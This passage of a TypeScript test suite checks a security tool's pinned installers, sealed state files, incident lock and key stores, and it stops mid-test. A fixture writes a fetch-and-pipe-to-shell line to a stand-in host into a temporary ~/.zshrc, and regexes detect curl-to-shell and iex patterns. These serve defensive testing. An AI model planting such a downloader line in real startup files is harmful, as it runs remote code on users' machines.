// What vswarm's own trust rests on: the installers' pinned Bun, the seals on its state files and incident log, signed
// posture reports and team policy. Nothing here touches the real home, Keychain, secret service or DPAPI: keys live
// in temp files, and the CLI runs with its state in a temp folder.
import { describe, expect, test } from "bun:test";
import { appendFileSync, existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Ctx } from "../src/sec/ctx";
import { check } from "../src/sec/engine";
import { verdictNow } from "../src/sec/gate";
import { lookAlike, osvMalicious } from "../src/sec/intel";
import { applyAllow, loadPolicy, matches, parsePolicy, signPolicy, teamJoin, teamSync } from "../src/sec/team";
import { posture, REPORT_NAMESPACE, signReport, writePosture } from "../src/sec/report";
import { forBaseline, scan } from "../src/sec/scan";
import { DPAPI_PROTECT, DPAPI_UNPROTECT, dpapiStore, entryMac, fileStore, keychainAddLine, keychainStore, platformStore, secretServiceStore, securityArg, type KeyStore, type Runner } from "../src/sec/seal";
import {
  activeStore, appendAudit, chooseStore, clearLock, files, KIND_NAME, keyStore, lockState, readAccepted, readAudit, readBaseline, readLast, readLog, saveAccepted, saveBaseline, saveLast, setLock, stateKey, useKeyStore, useStores,
} from "../src/sec/store";
import type { Scan } from "../src/sec/types";

const ROOT = join(import.meta.dir, "..");
const WIN = process.platform === "win32";

describe("installers: Bun is pinned, not piped", () => {
  // A Windows checkout may turn line ends into CRLF.
  const sh = readFileSync(join(ROOT, "install.sh"), "utf8").replace(/\r\n/g, "\n");
  const ps = readFileSync(join(ROOT, "install.ps1"), "utf8").replace(/\r\n/g, "\n");

  test("one Bun version in both scripts, and a SHA-256 for every platform the scripts pick", () => {
    const shVersion = /^BUN_VERSION=(\S+)$/m.exec(sh)?.[1];
    const psVersion = /\$BunVersion = '([^']+)'/.exec(ps)?.[1];
    expect(shVersion).toMatch(/^\d+\.\d+\.\d+$/);
    expect(psVersion).toBe(shVersion!);
    const shPins = Object.fromEntries([...sh.matchAll(/^\s+(bun-[\w-]+)\) echo ([0-9a-f]+) ;;$/gm)].map((m) => [m[1], m[2]]));
    const psPins = Object.fromEntries([...ps.matchAll(/'(bun-windows-[\w-]+)'\s*=\s*'([0-9a-f]+)'/g)].map((m) => [m[1], m[2]]));
    const unix = ["bun-darwin-aarch64", "bun-darwin-x64", "bun-darwin-x64-baseline", "bun-linux-aarch64", "bun-linux-aarch64-musl",
      "bun-linux-x64", "bun-linux-x64-baseline", "bun-linux-x64-musl", "bun-linux-x64-musl-baseline"];
    expect(Object.keys(shPins).sort()).toEqual(unix.sort());
    expect(Object.keys(psPins).sort()).toEqual(["bun-windows-aarch64", "bun-windows-x64", "bun-windows-x64-baseline"]);
    for (const h of [...Object.values(shPins), ...Object.values(psPins)]) expect(h).toMatch(/^[0-9a-f]{64}$/);
    // Every pin is its own: a copy-paste slip would give two zips one hash.
    expect(new Set([...Object.values(shPins), ...Object.values(psPins)]).size).toBe(unix.length + 3);
    // The download names the pinned version, and a mismatch stops before anything is unpacked.
    expect(sh).toContain("releases/download/bun-v$BUN_VERSION/$asset.zip");
    expect(sh.indexOf('[ "$got" = "$want" ]')).toBeLessThan(sh.indexOf("unzip -q"));
    expect(ps).toContain("releases/download/bun-v$BunVersion/$Asset.zip");
    expect(ps.indexOf("$Got -ne $BunSha256[$Asset]")).toBeLessThan(ps.indexOf("Expand-Archive"));
  });

  test("no script from the network goes into a shell for Bun", () => {
    const code = (t: string) => t.split("\n").filter((l) => !/^\s*#/.test(l)).join("\n");
    expect(code(sh)).not.toMatch(/bun\.sh\/install/);
    expect(code(sh)).not.toMatch(/curl[^\n]*\|\s*(ba)?sh/);
    expect(code(ps)).not.toMatch(/bun\.sh\/install/);
    expect(code(ps)).not.toMatch(/\[scriptblock\]::Create|Invoke-RestMethod|\|\s*iex\b/i);
    // An existing Bun is still used first.
    expect(sh.indexOf("command -v bun")).toBeLessThan(sh.indexOf("install_bun\n  BUN="));
    expect(ps.indexOf("Get-Command bun")).toBeLessThan(ps.indexOf("$BunSha256 = @{"));
  });

  test.skipIf(WIN)("install.sh picks the zip for each system and CPU", async () => {
    const pick = async (s: string, m: string) => {
      const script = `VSWARM_INSTALL_LIB=1\n. "$0"\nuname() { case "$1" in -s) echo ${s};; -m) echo ${m};; esac; }\nsysctl() { echo 0; }\nbun_asset || echo none`;
      const p = Bun.spawn(["sh", "-c", script, join(ROOT, "install.sh")], { stdout: "pipe", stderr: "pipe" });
      return (await new Response(p.stdout).text()).trim();
    };
    expect(await pick("Darwin", "arm64")).toBe("bun-darwin-aarch64");
    // sysctl answers "0" here, so no AVX2 is seen: the baseline build.
    expect(await pick("Darwin", "x86_64")).toBe("bun-darwin-x64-baseline");
    expect(["bun-linux-aarch64", "bun-linux-aarch64-musl"]).toContain(await pick("Linux", "aarch64"));
    expect(await pick("Linux", "x86_64")).toMatch(/^bun-linux-x64(-musl)?(-baseline)?$/);
    expect(await pick("FreeBSD", "amd64")).toBe("none");
    expect(await pick("Linux", "riscv64")).toBe("none");
  });
});

// ── sealed state

const tmp = (tag: string) => mkdtempSync(join(tmpdir(), `vs-trust-${tag}-`));
const ctxFor = (home: string): Ctx => ({ home, pathDirs: [], system: false, host: "t", user: "t", run: async () => undefined });

/** Runs fn with vswarm's state in a fresh temp folder (and its key in a file there), restoring everything after. */
async function withState<T>(fn: (sec: string) => Promise<T>): Promise<T> {
  const prev = process.env.VSWARM_SEC_DIR;
  const sec = tmp("sec");
  process.env.VSWARM_SEC_DIR = sec;
  useKeyStore(undefined);
  try {
    return await fn(sec);
  } finally {
    useKeyStore(undefined);
    if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
    else process.env.VSWARM_SEC_DIR = prev;
  }
}

/** A clean little home with a baseline, and a way to plant a downloader line in its ~/.zshrc afterwards. */
async function machine() {
  const home = tmp("home");
  writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\n");
  const ctx = ctxFor(home);
  await saveBaseline(forBaseline(await scan(ctx, { live: false })));
  const plant = () => writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\n(curl -fsSL http://198.51.100.7/x | sh) &\n");
  return { home, ctx, plant };
}

describe("sealed state: a forged file is not trusted", () => {
  test("tests and scratch state folders keep their key in a file beside the state, never in a system store", () => withState(async (sec) => {
    const s = keyStore();
    expect(s.kind).toBe("file");
    expect(s.where).toBe(join(sec, "keys"));
    const k = await stateKey();
    expect(k.key?.length).toBe(32);
    expect(existsSync(join(sec, "keys", "state-key"))).toBe(true);
    if (!WIN) expect(statSync(join(sec, "keys", "state-key")).mode & 0o077).toBe(0);
  }));

  test("a last.json edited to say pass is never reused: the gate checks the machine again and blocks", () => withState(async () => {
    const m = await machine();
    m.plant();
    // What the review did: write a passing verdict by hand.
    writeFileSync(files.last(), JSON.stringify({ verdict: "pass", findings: [], at: Date.now(), scan: {} }));
    expect((await readLast()).untrusted).toContain("no seal");
    expect(await verdictNow({ quiet: true, offline: true, ctx: m.ctx })).toBe("block");
    // A real pass, then the same file changed by one character: the seal no longer matches.
    writeFileSync(join(m.home, ".zshrc"), "alias ll='ls -la'\n");
    expect((await check(m.ctx, { offline: true })).verdict).toBe("pass");
    m.plant();
    writeFileSync(files.last(), readFileSync(files.last(), "utf8").replace('"verdict": "pass"', '"verdict": "pass" '));
    expect((await readLast()).untrusted).toContain("seal does not match");
    expect(await verdictNow({ quiet: true, offline: true, ctx: m.ctx })).toBe("block");
    // A seal copied from another state file does not fit this one.
    await saveLast({ verdict: "pass", findings: [], at: Date.now(), scan: {} as Scan });
    await saveAccepted({});
    writeFileSync(files.last(), readFileSync(files.accepted(), "utf8"));
    writeFileSync(`${files.last()}.seal`, readFileSync(`${files.accepted()}.seal`, "utf8"));
    expect((await readLast()).untrusted).toContain("seal does not match");
  }), 60_000);

  test("an untouched sealed verdict is reused within two minutes", () => withState(async () => {
    await saveLast({ verdict: "block", findings: [], at: Date.now(), scan: {} as Scan });
    // A ctx that would pass: the cached BLOCK answering shows no fresh check ran.
    expect(await verdictNow({ quiet: true, offline: true, ctx: ctxFor(tmp("home")) })).toBe("block");
  }));

  test("an edited baseline is set aside and blocks; it cannot be accepted away", () => withState(async () => {
    const m = await machine();
    writeFileSync(files.baseline(), readFileSync(files.baseline(), "utf8").replace('"user": "t"', '"user": "x"'));
    expect((await readBaseline()).untrusted).toContain("seal does not match");
    const r = await check(m.ctx, { offline: true });
    expect(r.verdict).toBe("block");
    expect(r.baseline).toBeUndefined();
    const f = r.findings.find((x) => x.rule === "vswarm-state");
    expect(f?.severity).toBe("high");
    // Accepted the proper way, it still shows: findings about vswarm's own files are never filtered.
    await saveAccepted({ [f!.id]: { at: Date.now(), title: f!.title } });
    expect((await check(m.ctx, { offline: true })).findings.some((x) => x.id === f!.id)).toBe(true);
    // A new baseline is sealed again.
    await saveBaseline(forBaseline(await scan(m.ctx, { live: false })));
    expect((await check(m.ctx, { offline: true })).verdict).toBe("pass");
  }), 60_000);

  test("an accepted list edited by hand accepts nothing and says so", () => withState(async () => {
    const m = await machine();
    m.plant();
    const r = await check(m.ctx, { offline: true });
    const id = r.findings.find((x) => x.rule === "startup-file")!.id;
    writeFileSync(files.accepted(), JSON.stringify({ [id]: { at: Date.now(), title: "forged" } }));
    expect((await readAccepted()).untrusted).toBeDefined();
    const again = await check(m.ctx, { offline: true });
    expect(again.findings.some((x) => x.id === id)).toBe(true);
    expect(again.findings.some((x) => x.id === "vswarm-state:accepted" && x.severity === "medium")).toBe(true);
    await saveAccepted({ [id]: { at: Date.now(), title: "mine" } });
    expect((await check(m.ctx, { offline: true })).findings.some((x) => x.id === id)).toBe(false);
  }), 60_000);
});

describe("the lock and the incident log", () => {
  const lock = { incident: "20260101-000000", at: Date.now(), reason: "test" };
  const dropLock = () => {
    rmSync(files.lock(), { force: true });
    rmSync(`${files.lock()}.seal`, { force: true });
  };

  test("a deleted lock file keeps the incident open; vswarm unlock closes it", () => withState(async () => {
    await setLock(lock);
    expect((await lockState()).lock?.incident).toBe(lock.incident);
    dropLock();
    const st = await lockState();
    expect(st.lock?.incident).toBe(lock.incident);
    expect(st.why).toContain("lock file is gone");
    expect(await verdictNow({ quiet: true, offline: true, ctx: ctxFor(tmp("home")) })).toBe("block");
    await clearLock(lock.incident);
    expect((await lockState()).lock).toBeUndefined();
    expect((await readLog()).entries.map((e) => e.event)).toEqual(["lock", "unlock"]);
  }));

  test("a lock file edited or written by hand still blocks", () => withState(async () => {
    await setLock(lock);
    writeFileSync(files.lock(), JSON.stringify({ ...lock, reason: "nothing to see" }));
    const st = await lockState();
    expect(st.lock).toBeDefined();
    expect(st.why).toContain("seal does not match");
    await clearLock(lock.incident);
    // A hand-written lock with no log behind it blocks too (the Windows CI does this on purpose).
    writeFileSync(files.lock(), JSON.stringify({ incident: "ci", at: 0, reason: "CI" }));
    expect((await lockState()).lock?.incident).toBe("ci");
    dropLock();
    expect((await lockState()).lock).toBeUndefined();
  }));

  test("a log cut back to before the lock, deleted, or edited keeps the machine locked; unlock needs a reset then", () => withState(async () => {
    await setLock(lock);
    await clearLock(lock.incident);
    await setLock({ ...lock, incident: "second" });
    const text = readFileSync(files.log(), "utf8");
    // Cut to "lock, unlock": a shorter chain that verifies on its own.
    writeFileSync(files.log(), text.split("\n").slice(0, 2).join("\n") + "\n");
    dropLock();
    let st = await lockState();
    expect(st.lock).toBeDefined();
    expect(st.why).toContain("cut short");
    rmSync(files.log());
    st = await lockState();
    expect(st.why).toContain("was deleted");
    writeFileSync(files.log(), text.replace('"reason":"test"', '"reason":"tset"'));
    expect((await readLog()).why).toContain("changed outside vswarm");
    expect((await lockState()).lock).toBeDefined();
    await expect(clearLock("second")).rejects.toThrow("incident log");
    const r = await clearLock("second", { reset: true });
    expect(r.kept && existsSync(r.kept)).toBe(true);
    expect((await lockState()).lock).toBeUndefined();
    expect((await readLog()).entries.map((e) => e.event)).toEqual(["reset"]);
  }));

  test("upgrading from unsealed files: the first key adopts the baseline and an open lock, and drops the old verdict", () => withState(async () => {
    writeFileSync(files.baseline(), JSON.stringify({ version: 1, host: "t", user: "t", home: "/x", at: 1, items: [], texts: {}, gaps: {} }));
    writeFileSync(files.lock(), JSON.stringify(lock));
    writeFileSync(files.last(), JSON.stringify({ verdict: "pass", findings: [], at: Date.now(), scan: {} }));
    expect((await readBaseline()).untrusted).toBeUndefined();
    const st = await lockState();
    expect(st.lock?.incident).toBe(lock.incident);
    expect(st.why).toBeUndefined();
    expect((await readLog()).entries[0].event).toBe("lock");
    expect(existsSync(files.last())).toBe(false);
  }));

  test("a key lost after seals existed adopts nothing: the old seals stay untrusted", () => withState(async (sec) => {
    await saveBaseline({ version: 1, host: "t", user: "t", home: "/x", at: 1, items: [], texts: {}, gaps: {} });
    rmSync(join(sec, "keys"), { recursive: true });
    useKeyStore(undefined);
    expect((await readBaseline()).untrusted).toContain("seal does not match");
  }));

  test("a key store that does not answer: nothing cached is reused, a lock file still blocks, the check warns", () => withState(async () => {
    const m = await machine();
    const locked: KeyStore = { kind: "keychain", where: "test", get: async () => { throw new Error("User interaction is not allowed"); }, set: async () => {}, remove: async () => {} };
    useKeyStore(locked);
    await saveLast({ verdict: "pass", findings: [], at: Date.now(), scan: {} as Scan });
    expect((await readLast()).nokey).toBe(true);
    const r = await check(m.ctx, { offline: true });
    expect(r.findings.find((f) => f.id === "vswarm-state:nokey")?.severity).toBe("medium");
    writeFileSync(files.lock(), JSON.stringify(lock));
    expect(await verdictNow({ quiet: true, offline: true, ctx: m.ctx })).toBe("block");
  }), 60_000);
});

/** A file store that can stop answering, as a locked Keychain does. A file kind, so nothing ever falls back elsewhere. */
function flaky(dir: string) {
  const inner = fileStore(dir);
  const no = () => {
    throw new Error("User interaction is not allowed");
  };
  const s = {
    down: false,
    kind: "file" as const,
    where: dir,
    get: async (n: string) => (s.down ? no() : inner.get(n)),
    set: async (n: string, v: string) => (s.down ? no() : inner.set(n, v)),
    remove: async (n: string) => (s.down ? no() : inner.remove(n)),
  };
  return s;
}

describe("a key store that does not always answer", () => {
  const lock = { incident: "20260101-000000", at: Date.now(), reason: "test" };
  const dropLock = () => {
    rmSync(files.lock(), { force: true });
    rmSync(`${files.lock()}.seal`, { force: true });
  };

  test("no entry is ever written without its seal: the append fails and writes nothing, and the chain verifies when the store answers again", () => withState(async (sec) => {
    const s = flaky(join(sec, "k"));
    useKeyStore(s);
    expect((await stateKey()).key).toBeDefined();
    // A later process (an agent started by launchd) finds the store not answering.
    s.down = true;
    useKeyStore(s);
    // What the review did: one append while the store throws. Before, it wrote mac "" and the log read as tampered for good.
    await expect(appendAudit("sign", "SHA256:x", "PASS · test")).rejects.toThrow("could not be sealed");
    expect(existsSync(files.audit())).toBe(false);
    // The lock path the same way: the lock file holds the incident open, the log gets no unsealed entry.
    expect((await setLock(lock)).unsealed).toContain("sealing key");
    expect(existsSync(files.log())).toBe(false);
    expect((await lockState()).lock?.incident).toBe(lock.incident);
    // An unlock cannot be recorded, so it is refused before anything is removed.
    await expect(clearLock(lock.incident)).rejects.toThrow("cannot record the unlock");
    expect(existsSync(files.lock())).toBe(true);
    s.down = false;
    useKeyStore(s);
    await appendAudit("sign", "SHA256:x", "PASS · test");
    const a = await readAudit();
    expect([a.why, a.entries.length]).toEqual([undefined, 1]);
    // The lock file from while the store was down has no seal: it still blocks, and says why; unlock closes it.
    expect((await lockState()).why).toContain("no seal");
    await clearLock(lock.incident);
    expect((await lockState()).lock).toBeUndefined();
    expect((await readLog()).why).toBeUndefined();
  }));

  test("a store that did not answer is asked again after a short wait; a key once read stays for the process", () => withState(async (sec) => {
    const s = flaky(join(sec, "k"));
    s.down = true;
    useKeyStore(s);
    expect((await stateKey()).error).toContain("User interaction");
    s.down = false;
    // Within the wait the failure stands (a gate does not hammer a locked Keychain)…
    expect((await stateKey()).key).toBeUndefined();
    await Bun.sleep(1100);
    // …then it is asked again: an agent started before the Keychain answered recovers on its own.
    expect((await stateKey()).key?.length).toBe(32);
    s.down = true;
    expect((await stateKey()).key?.length).toBe(32);
  }));

  test("without the key the log cannot prove an unlock: an incident it opened stays open, a forged unlock closes nothing", () => withState(async (sec) => {
    const s = flaky(join(sec, "k"));
    useKeyStore(s);
    // A machine that never had an incident is not locked by a store that does not answer.
    s.down = true;
    expect((await lockState()).lock).toBeUndefined();
    s.down = false;
    useKeyStore(s);
    await setLock(lock);
    dropLock();
    const good = readFileSync(files.log(), "utf8");
    // What the review did: an unlock line written by hand, with a made-up MAC.
    appendFileSync(files.log(), JSON.stringify({ n: 2, at: Date.now(), event: "unlock", incident: lock.incident, prev: JSON.parse(good).mac, mac: "f".repeat(64) }) + "\n");
    expect((await lockState()).why).toContain("changed outside vswarm");
    s.down = true;
    useKeyStore(s);
    let st = await lockState();
    expect(st.lock?.incident).toBe(lock.incident);
    expect(st.why).toContain("cannot read its sealing key");
    expect(await verdictNow({ quiet: true, offline: true, ctx: ctxFor(tmp("home")) })).toBe("block");
    // A real unlock cannot be shown either while the store is down; once it answers, it counts.
    writeFileSync(files.log(), good);
    s.down = false;
    useKeyStore(s);
    await clearLock(lock.incident);
    s.down = true;
    useKeyStore(s);
    expect((await lockState()).lock?.incident).toBe(lock.incident);
    s.down = false;
    useKeyStore(s);
    expect((await lockState()).lock).toBeUndefined();
  }));

  test("a log from 2.6 with entries written while the store did not answer: reported once, set aside, a new chain; nothing in it counts as sealed", () => withState(async (sec) => {
    const s = flaky(join(sec, "k"));
    useKeyStore(s);
    await appendAudit("sign", "SHA256:x", "PASS · one");
    await appendAudit("sign", "SHA256:x", "PASS · two");
    const key = (await stateKey()).key!;
    // What 2.6 wrote: an entry with an empty MAC while the store was down (the head not moved), then a sealed one after.
    const old = (text: string) => text.trim().split("\n").map((l) => JSON.parse(l));
    const [, two] = old(readFileSync(files.audit(), "utf8"));
    const three = { n: 3, at: Date.now(), event: "sign", incident: "SHA256:x", reason: "PASS · while down", prev: two.mac, mac: "" };
    const four0 = { n: 4, at: Date.now(), event: "refuse", incident: "SHA256:x", reason: "BLOCK · after", prev: "" };
    const four = { ...four0, mac: entryMac(key, four0) };
    appendFileSync(files.audit(), `${JSON.stringify(three)}\n${JSON.stringify(four)}\n`);
    await s.set("audit-head", `4:${four.mac}`);
    const a = await readAudit();
    expect(a.why).toBeUndefined();
    expect(a.notice).toContain("1 entry written while the key store was unavailable");
    expect(a.entries.map((e) => e.event)).toEqual(["reset"]);
    expect(readdirSync(sec).filter((f) => f.startsWith("audit.log.unsealed-")).length).toBe(1);
    // Once: the next read is a clean, sealed chain.
    const again = await readAudit();
    expect([again.why, again.notice, again.entries.length]).toEqual([undefined, undefined, 1]);
    // A changed entry is still a changed entry, empty MAC or not.
    appendFileSync(files.audit(), JSON.stringify({ ...three, n: 9 }) + "\n");
    expect((await readAudit()).why).toContain("changed outside vswarm");

    // The incident log: a sealed lock, then an unlock 2.6 wrote without a seal. The unlock proves nothing: still open.
    await setLock(lock);
    dropLock();
    const [l1] = old(readFileSync(files.log(), "utf8"));
    appendFileSync(files.log(), JSON.stringify({ n: 2, at: Date.now(), event: "unlock", incident: lock.incident, prev: l1.mac, mac: "" }) + "\n");
    const st = await lockState();
    expect(st.lock?.incident).toBe(lock.incident);
    expect((await readLog()).entries.map((e) => e.event)).toEqual(["reset", "lock"]);
    await clearLock(lock.incident);
    expect((await lockState()).lock).toBeUndefined();
  }));
});

describe("which store holds the key: keystore.json is checked against the system's own store", () => {
  const mem = (kind: KeyStore["kind"], init: Record<string, string> = {}, broken = false): KeyStore & { m: Record<string, string> } => {
    const m = { ...init };
    const no = () => {
      throw new Error("not answering");
    };
    return { m, kind, where: `test ${kind}`, get: async (n) => (broken ? no() : m[n]), set: async (n, v) => void (broken ? no() : (m[n] = v)), remove: async (n) => void delete m[n] };
  };
  const key = "a".repeat(64);

  test("a downgrade to a file that vswarm did not make is caught; one vswarm made, or a machine that only ever had a file, is not", async () => {
    const file = mem("file");
    const of = (k: KeyStore["kind"], p: KeyStore) => (k === "file" ? file : p);
    for (const kind of ["keychain", "secret-service", "dpapi"] as const) {
      // keystore.json edited to "file" while the system store still holds vswarm's key.
      let p = mem(kind, { "state-key": key });
      let c = await chooseStore("file", p, (k) => of(k, p));
      expect([kind, c.store.kind, c.tampered]).toEqual([kind, kind, expect.stringContaining("vswarm did not make that change")]);
      // …or that notes another kind.
      p = mem(kind, { [KIND_NAME]: kind });
      expect((await chooseStore("file", p, (k) => of(k, p))).tampered).toContain(`notes that vswarm chose ${kind}`);
      // vswarm's own move to a file (the system store would not keep the key): noted, so not a finding.
      p = mem(kind, { [KIND_NAME]: "file" });
      c = await chooseStore("file", p, (k) => of(k, p));
      expect([c.store.kind, c.tampered]).toEqual(["file", undefined]);
      // Nothing of vswarm's in the system store, or a store that does not answer: the file, nothing to say.
      p = mem(kind);
      expect(await chooseStore("file", p, (k) => of(k, p))).toEqual({ store: file });
      p = mem(kind, {}, true);
      expect(await chooseStore("file", p, (k) => of(k, p))).toEqual({ store: file });
      // keystore.json that agrees, or is missing.
      p = mem(kind);
      expect((await chooseStore(kind, p, (k) => of(k, p))).store).toBe(p);
      expect((await chooseStore(undefined, p, (k) => of(k, p))).store).toBe(p);
    }
  });

  test("the check reports it as a finding, and seals with the system store, not the file someone chose", () => withState(async () => {
    const m = await machine();
    const platform = mem("keychain");
    const file = mem("file");
    useStores({ recorded: "keychain", platform, file });
    await saveBaseline(forBaseline(await scan(m.ctx, { live: false })));
    expect(platform.m["state-key"]).toMatch(/^[0-9a-f]{64}$/);
    expect(platform.m[KIND_NAME]).toBe("keychain");
    // keystore.json changed to "file", with a key of the attacker's own in the file.
    file.m["state-key"] = "b".repeat(64);
    useStores({ recorded: "file", platform, file });
    expect((await activeStore()).store).toBe(platform);
    const r = await check(m.ctx, { offline: true });
    const f = r.findings.find((x) => x.id === "vswarm-state:keystore");
    expect(f?.severity).toBe("high");
    expect(r.verdict).toBe("block");
    // The baseline sealed with the system store's key still verifies: the file's key is not used.
    expect((await readBaseline()).untrusted).toBeUndefined();
    useStores(undefined);
  }), 60_000);

  test("vswarm's own fallback to a file leaves no key in the system store and notes it, so it is not taken for tampering", () => withState(async () => {
    // A system store that takes the write but gives back something else (as a Keychain that will not keep it).
    const m: Record<string, string> = {};
    const platform: KeyStore = { kind: "keychain", where: "test keychain", get: async (n) => (n === "state-key" && m[n] ? "0".repeat(64) : m[n]), set: async (n, v) => void (m[n] = v), remove: async (n) => void delete m[n] };
    const file = mem("file");
    useStores({ recorded: undefined, platform, file });
    expect((await stateKey()).store).toBe(file);
    expect(m["state-key"]).toBeUndefined();
    expect(m[KIND_NAME]).toBe("file");
    useStores({ recorded: "file", platform, file });
    expect((await stateKey()).tampered).toBeUndefined();
    useStores(undefined);
  }));
});

describe("key stores: the commands they run (nothing real is called)", () => {
  const recorder = (answers: { code: number; out?: string; err?: string }[]) => {
    const calls: { cmd: string[]; stdin?: string; env?: Record<string, string | undefined> }[] = [];
    const run: Runner = async (cmd, opt = {}) => {
      calls.push({ cmd, ...opt });
      const a = answers.shift() ?? { code: 0 };
      return { code: a.code, out: a.out ?? "", err: a.err ?? "" };
    };
    return { calls, run };
  };

  test("macOS Keychain: found, not found (44), locked", async () => {
    const r = recorder([{ code: 0, out: "ab\n" }, { code: 44 }, { code: 36, err: "User interaction is not allowed." }, { code: 0 }, { code: 25 }]);
    const s = keychainStore(r.run);
    expect(await s.get("state-key")).toBe("ab");
    expect(await s.get("state-key")).toBeUndefined();
    await expect(s.get("state-key")).rejects.toThrow("User interaction is not allowed");
    const secret = "5e3c0ffee5e3c0ffee5e3c0ffee5e3c0ffee5e3c0ffee5e3c0ffee5e3c0ffee1";
    await s.set("state-key", secret);
    expect(r.calls[0].cmd).toEqual(["/usr/bin/security", "find-generic-password", "-s", "dev.vswarm.seal", "-a", "state-key", "-w"]);
    // The secret never reaches the command line (any process can read that in ps): `security -i` reads it on stdin.
    expect(r.calls[3].cmd).toEqual(["/usr/bin/security", "-i"]);
    expect(r.calls.flatMap((c) => c.cmd).some((a) => a.includes(secret))).toBe(false);
    expect(r.calls[3].stdin).toBe(`"add-generic-password" "-U" "-s" "dev.vswarm.seal" "-a" "state-key" "-l" "vswarm: seal of its own state files" "-w" "${secret}"\n`);
    // security -i exits with the status of the command it ran.
    await expect(s.set("state-key", secret)).rejects.toThrow("could not write to the Keychain");
  });

  test("macOS Keychain: values are quoted for the command parser of security -i (quotes, spaces, backslashes); a line break is refused", () => {
    // How `security -i` splits a line, as checked against /usr/bin/security itself (show-keychain-info on a path that
    // does not exist echoes the argument it got): a double-quoted word, \ escaping the next character.
    const split = (line: string) => {
      const out: string[] = [];
      let i = 0;
      while (i < line.length) {
        while (line[i] === " ") i++;
        if (i >= line.length) break;
        let w = "";
        const q = line[i] === '"' ? (i++, true) : false;
        for (; i < line.length; i++) {
          if (line[i] === "\\") w += line[++i] ?? "";
          else if (q ? line[i] === '"' : line[i] === " ") break;
          else w += line[i];
        }
        if (q) i++;
        out.push(w);
      }
      return out;
    };
    for (const v of ['a b"c\\d', "'x' \\\\ \"\" end\\", "tab\there $HOME `x`", "", "-w"]) expect(split(securityArg(v))).toEqual([v]);
    expect(split(keychainAddLine("state-key", 'q"\\ v').trimEnd()).slice(-2)).toEqual(["-w", 'q"\\ v']);
    expect(() => securityArg("a\nfind-generic-password")).toThrow("line break");
    expect(() => securityArg("a\rb")).toThrow("line break");
  });

  test("Linux Secret Service: the value goes in on stdin; no D-Bus is an error, not 'no key'", async () => {
    const r = recorder([{ code: 1 }, { code: 1, err: "Cannot autolaunch D-Bus without X11 $DISPLAY" }, { code: 0 }]);
    const s = secretServiceStore(r.run);
    expect(await s.get("state-key")).toBeUndefined();
    await expect(s.get("state-key")).rejects.toThrow("D-Bus");
    await s.set("state-key", "secretvalue");
    expect(r.calls[2].cmd).not.toContain("secretvalue");
    expect(r.calls[2].stdin).toBe("secretvalue");
  });

  test("Windows DPAPI: the value and the blob travel in environment variables, never in the script", async () => {
    const dir = tmp("dpapi");
    const ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    const r = recorder([{ code: 0, out: "QkxPQg==\r\n" }, { code: 0, out: "cd\r\n" }, { code: 1, err: "Key not valid for use in specified state." }]);
    const s = dpapiStore(dir, r.run, ps);
    expect(await s.get("state-key")).toBeUndefined();
    await s.set("state-key", "cd");
    expect(readFileSync(join(dir, "state-key.dpapi"), "utf8").trim()).toBe("QkxPQg==");
    expect(r.calls[0].cmd).toEqual([ps, "-NoProfile", "-NonInteractive", "-Command", DPAPI_PROTECT]);
    expect(r.calls[0].env).toEqual({ VSWARM_SEAL_IN: "cd" });
    expect(await s.get("state-key")).toBe("cd");
    expect(r.calls[1].cmd.at(-1)).toBe(DPAPI_UNPROTECT);
    expect(r.calls[1].env).toEqual({ VSWARM_SEAL_BLOB: "QkxPQg==" });
    await expect(s.get("state-key")).rejects.toThrow("DPAPI could not open");
  });

  test("the system's own store per platform; the file store treats a missing file as no key", async () => {
    expect(platformStore("darwin").kind).toBe(existsSync("/usr/bin/security") ? "keychain" : "file");
    expect(platformStore("win32").kind).toBe("dpapi");
    expect(platformStore("linux", true).kind).toBe("secret-service");
    expect(platformStore("linux", false).kind).toBe("file");
    const s = fileStore(join(tmp("fs"), "keys"));
    expect(await s.get("x")).toBeUndefined();
    await s.set("x", "v");
    expect(await s.get("x")).toBe("v");
    await s.remove("x");
    expect(await s.get("x")).toBeUndefined();
  });
});

describe("preflight --quiet and packages new since the last lookup", () => {
  test("only versions never asked about go to OSV; offline, they are counted as unchecked", async () => {
    const cache = join(tmp("osv"), "osv-cache.json");
    // An answer two days old for a, none for b.
    writeFileSync(cache, JSON.stringify({ "npm:a@1.0.0": { at: Date.now() - 2 * 86_400_000, mal: [] } }));
    const items = [{ kind: "npm", id: "a", name: "a", version: "1.0.0" }, { kind: "npm", id: "b", name: "b", version: "2.0.0" }];
    const real = globalThis.fetch;
    const asked: string[] = [];
    try {
      globalThis.fetch = (async (_u: unknown, init: any) => {
        const q = JSON.parse(init.body).queries;
        asked.push(...q.map((x: any) => x.package.name));
        return new Response(JSON.stringify({ results: q.map(() => ({ vulns: [{ id: "MAL-2099-7" }] })) }), { status: 200 });
      }) as unknown as typeof fetch;
      const r = await osvMalicious(items, cache, { onlyNew: true, timeoutMs: 3000 });
      expect(asked).toEqual(["b"]);
      expect(r.hits.map((h) => h.item.name)).toEqual(["b"]);
      expect(r.unchecked).toBe(0);
      globalThis.fetch = (async () => {
        throw new Error("offline");
      }) as unknown as typeof fetch;
      const r2 = await osvMalicious([...items, { kind: "npm", id: "c", name: "c", version: "3.0.0" }], cache, { onlyNew: true, timeoutMs: 3000 });
      expect(r2.unchecked).toBe(1);
      expect(r2.error).toContain("1 package version new since the last full check was not checked");
    } finally {
      globalThis.fetch = real;
    }
  });
});

describe("signed reports for a server that decides", () => {
  test.skipIf(WIN || !Bun.which("ssh-keygen"))("the report signs with a throwaway key, verifies with ssh-keygen, and a changed byte fails", () => withState(async () => {
    const m = await machine();
    m.plant();
    const r = await check(m.ctx, { offline: true });
    const p = posture(r, { name: "acme", serial: 3 });
    expect(p.verdict).toBe("block");
    expect(p.team).toEqual({ name: "acme", serial: 3 });
    expect(p.findings.some((f) => f.rule === "startup-file")).toBe(true);
    const dir = tmp("keys");
    const key = join(dir, "device");
    // A throwaway key without a passphrase, for this test only.
    expect(Bun.spawnSync(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "laptop@test", "-f", key]).exitCode).toBe(0);
    const text = JSON.stringify(p, null, 2) + "\n";
    const sig = await signReport(text, key);
    const [file, sigFile] = writePosture(join(dir, "reports"), text, sig);
